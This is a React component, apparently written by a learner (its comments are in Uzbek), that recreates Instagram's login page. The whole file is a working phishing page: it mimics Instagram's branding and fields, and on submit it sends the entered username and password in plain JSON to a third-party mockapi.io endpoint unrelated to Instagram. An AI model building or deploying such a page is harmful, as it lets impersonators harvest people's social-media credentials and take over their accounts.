import React, { useState } from "react";

const Insta = () => {
  const [form, setForm] = useState({ username: "", password: "" });
  const [data, setData] = useState<any[]>([]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch("https://687cc72c918b6422432f6d7d.mockapi.io/blog", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(form),
      });
      const result = await res.json();
      setData((prev) => [...prev, result]);

      // 🧼 INPUTNI TOZALASH
      setForm({ username: "", password: "" });
    } catch (err) {
      console.error("Yozishda xato");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="border border-gray-300 p-8 w-80 bg-white shadow-md">
        <h1 className="text-3xl font-logo text-center mb-6">Instagram</h1>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            name="username"
            value={form.username} // ✅ Bu input bilan state bog'lanadi
            onChange={handleChange}
            placeholder="Phone number, username, or email"
            className="w-full px-3 py-2 border rounded-sm text-sm border-gray-300 focus:outline-none"
            required
          />
          <input
            type="password"
            name="password"
            value={form.password} // ✅ Bu input bilan state bog'lanadi
            onChange={handleChange}
            placeholder="Password"
            className="w-full px-3 py-2 border rounded-sm text-sm border-gray-300 focus:outline-none"
            required
          />
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-sm font-semibold hover:bg-blue-600"
          >
            Log in
          </button>
        </form>
        <div className="my-4 flex items-center">
          <div className="border-t flex-grow border-gray-300"></div>
          <span className="mx-3 text-gray-500 text-sm">OR</span>
          <div className="border-t flex-grow border-gray-300"></div>
        </div>
        <div className="text-center text-blue-600 font-medium cursor-pointer text-sm">
          Log in with Facebook
        </div>
        <div className="text-center mt-4 text-sm text-blue-900 cursor-pointer">
          Forgot password?
        </div>
      </div>
    </div>
  );
};

export default Insta;
